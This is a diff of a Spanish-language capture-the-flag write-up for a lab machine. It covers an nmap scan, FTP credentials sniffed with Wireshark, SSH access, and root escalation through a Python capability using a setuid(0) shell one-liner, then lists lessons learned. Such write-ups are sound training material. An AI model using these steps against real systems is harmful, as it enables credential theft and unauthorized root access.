@@ -33,12 +33,26 @@ sudo nmap -p- --open -sCVS -n -Pn -vvv --script vuln -oN escaneo 10.129.37.59
 
 http://10.129.37.59/data/0
 
+🔎 Observación:
+
+Posible endpoint accesible sin autenticación
+Puede contener archivos o rutas interesantes
+
 ## 📡 3. Captura de credenciales (Wireshark)
 
-Usuario: nathan\
-Contraseña: Buck3tH4TF0RM3!
+Se detecta tráfico FTP sin cifrar, lo que permite capturar credenciales:
 
-## 🔑 4. Acceso inicial
+🔐 Credenciales encontradas:
+-  Usuario: nathan
+-  Contraseña: Buck3tH4TF0RM3!
+
+⚠️ Explicación:
+
+El protocolo FTP transmite credenciales en texto plano, lo que permite interceptarlas fácilmente con herramientas como Wireshark.
+
+## 🔑 4. Acceso inicial (SSH)
+
+Se accede al sistema usando las credenciales obtenidas:
 
 ``` bash
 ssh nathan@10.129.37.59
@@ -46,29 +60,73 @@ ssh nathan@10.129.37.59
 
 ## 🧠 5. Enumeración de privilegios
 
+🔍 Verificar permisos sudo:
 ``` bash
 sudo -l
+```
+
+🔍 Buscar binarios con capacidades especiales:
+``` bash
 getcap -r / 2>/dev/null
 ```
 
 ## ⚡ 6. Escalada de privilegios
 
-Referencia: https://gtfobins.org/gtfobins/python/#library-load
+Se identifica que Python tiene capacidades especiales, lo que permite escalar privilegios.
+
+📚 Referencia:
+
+https://gtfobins.org/gtfobins/python/#library-load
+
+🚀 Exploit:
 
 ``` bash
 python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
-## 🏁 7. Flags
+🧠 Explicación:
+-  os.setuid(0) → Cambia el UID a root
+-  os.system("/bin/bash") → Ejecuta una shell como root
+  
+## 🏁 7. Captura de flags
 
-User:
-
+👤 User flag:
+``` bash
+find / -name user.txt 2>/dev/null
+``` 
 ``` bash
 /home/nathan/user.txt
 ```
 
-Root:
+👑 Root flag:
 
 ``` bash
+find / -name root.txt 2>/dev/null
+``` 
+``` bash
 /root/root.txt
-```
+``` 
+
+## 🧾 Conclusión
+
+🔓 Vector de ataque:
+
+- Enumeración de servicios expuestos
+- Intercepción de credenciales FTP (texto plano)
+- Acceso por SSH
+- Escalada de privilegios mediante capacidades en Python
+
+⚠️ Lecciones aprendidas:
+
+- Evitar uso de FTP sin cifrado
+- Revisar capacidades asignadas a binarios (getcap)
+- Limitar accesos y privilegios innecesarios
+- Implementar monitoreo de tráfico de red
+
+🧰 Herramientas utilizadas
+
+- Nmap
+- Wireshark
+- SSH
+- GTFOBins
+
